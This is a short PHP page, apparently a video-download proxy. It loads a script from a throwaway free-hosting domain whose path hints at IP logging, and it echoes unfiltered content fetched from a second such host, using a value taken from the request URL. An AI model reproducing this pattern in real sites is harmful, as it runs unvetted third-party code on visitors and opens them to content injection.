<script src="https://tovkr885.000webhostapp.com/ip/ddl.php"></script>
<?php

$str = $_SERVER['REQUEST_URI'];

$yt = file_get_contents('http://aioep.000webhostapp.com/@download/?v='.substr($str,-11).'');

echo $yt;
?>
